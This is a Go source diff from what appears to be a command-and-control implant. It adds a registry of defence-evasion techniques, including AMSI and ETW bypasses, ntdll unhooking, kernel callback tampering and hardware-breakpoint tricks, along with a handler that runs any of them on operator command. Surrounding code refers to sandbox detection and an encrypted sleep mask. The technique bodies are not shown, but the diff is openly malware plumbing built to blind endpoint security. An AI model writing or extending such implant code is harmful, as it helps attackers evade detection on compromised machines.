@@ -262,10 +262,10 @@ func handleSandboxDetect(task Task, res *TaskResult) {
 		})
 	}
 	jsonOut, _ := json.Marshal(map[string]interface{}{
-		"text":        sb.String(),
-		"is_sandbox":  totalConfidence >= 50,
-		"confidence":  totalConfidence,
-		"checks":      checks,
+		"text":       sb.String(),
+		"is_sandbox": totalConfidence >= 50,
+		"confidence": totalConfidence,
+		"checks":     checks,
 	})
 	res.Output = string(jsonOut)
 	res.Encoding = "json"
@@ -316,4 +316,54 @@ func handleSetSleepMaskAdvanced(task Task, res *TaskResult) {
 		return
 	}
 	res.Output = "sleep mask switched to: advanced (AES-CBC page encryption + stack splice)"
+}
+
+func init() {
+	wrap := func(fn func(Task, *TaskResult)) evasionFunc {
+		return func() string {
+			var res TaskResult
+			fn(Task{}, &res)
+			if res.Error != "" {
+				return "error: " + res.Error
+			}
+			return res.Output
+		}
+	}
+	registerEvasion("amsi", wrap(handleAMSIByPass))
+	registerEvasion("etw", wrap(handleETWByPass))
+	registerEvasion("etw_ntrace", wrap(handleETWNtraceBypass))
+	registerEvasion("amsi_session", wrap(handleAMSISessionBypass))
+	registerEvasion("blockdlls", wrap(handleBlockDLLs))
+	registerEvasion("unhook_ntdll", wrap(handleUnhookNtdll))
+	registerEvasion("protect_process", wrap(handleProtectProcess))
+	registerEvasion("amsi_hardware_bp", wrap(handleAMSIHardwareBP))
+	registerEvasion("etw_hardware_bp", wrap(handleETWHardwareBP))
+	registerEvasion("kernel_callback", wrap(handleEvasionKernelCallback))
+	registerEvasion("etwti", wrap(handleEvasionETWTI))
+	registerEvasion("enum_callbacks", wrap(handleEvasionEnumCallbacks))
+	registerEvasion("objcb", wrap(handleEvasionObjCB))
+	registerEvasion("imgload", wrap(handleEvasionImgLoad))
+}
+
+// Unified evasion handler - runs any registered technique by name
+func handleRunEvasion(task Task, res *TaskResult) {
+	technique := strings.TrimSpace(task.Command)
+	if technique == "" {
+		res.Error = "technique parameter required (e.g. amsi, etw, blockdlls, veh, syscall)"
+		return
+	}
+	if len(technique) > 64 {
+		technique = technique[:64]
+	}
+
+	output := runEvasion(technique)
+	if output == "" {
+		res.Error = fmt.Sprintf("unknown evasion technique: %s", technique)
+		return
+	}
+	if strings.HasPrefix(output, "error: ") {
+		res.Error = output[7:]
+		return
+	}
+	res.Output = output
 }
